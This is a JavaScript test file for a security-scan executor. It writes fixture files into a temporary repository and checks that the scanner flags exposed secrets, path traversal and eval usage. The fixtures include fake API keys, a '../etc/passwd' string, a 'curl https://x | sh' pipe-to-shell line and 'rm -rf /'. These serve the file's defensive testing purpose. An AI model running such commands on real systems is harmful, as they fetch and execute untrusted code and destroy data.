const fs = require('fs');
const os = require('os');
const path = require('path');
const { runSecurityScan } = require('../../tools/executors/security-scan-executor.js');

let passed = 0;
let failed = 0;
function assert(label, condition) {
  if (condition) { console.log(`  ✓ ${label}`); passed++; }
  else { console.error(`  ✗ FAIL: ${label}`); failed++; }
}

console.log('\n── SecurityScanExecutor ──');

{
  const repo = fs.mkdtempSync(path.join(os.tmpdir(), 'sec-scan-'));
  fs.mkdirSync(path.join(repo, 'src'), { recursive: true });
  fs.writeFileSync(path.join(repo, '.env'), 'API_KEY=secret\n');
  fs.writeFileSync(path.join(repo, 'src/secrets.js'), "const x='AKIA1234567890ABCDEF'; const k='sk-ABCDEFGHIJKLMNOPQRSTUVWXYZ123456';\n");
  fs.writeFileSync(path.join(repo, 'src/path.js'), "const p='../etc/passwd';\n");
  fs.writeFileSync(path.join(repo, 'src/eval.js'), "eval('2+2'); new Function('a','return a');\n");
  fs.writeFileSync(path.join(repo, 'src/shell.sh'), "curl https://x | sh\nrm -rf /\n");

  const report = runSecurityScan({ task_id: 's1' }, { cwd: repo });

  const byCat = (c) => report.findings.filter((f) => f.category === c);
  assert('secrets patterns detected', byCat('exposed_secrets').length > 0);
  assert('path traversal detected', byCat('path_traversal').length > 0);
  assert('insecure eval usage detected', byCat('insecure_eval').length > 0);
  assert('report has PASS/FAIL', report.status === 'FAIL' || report.status === 'PASS');
  assert('security_scan_report.json generated', fs.existsSync(path.join(repo, 'security_scan_report.json')));
}

module.exports = { passed, failed };
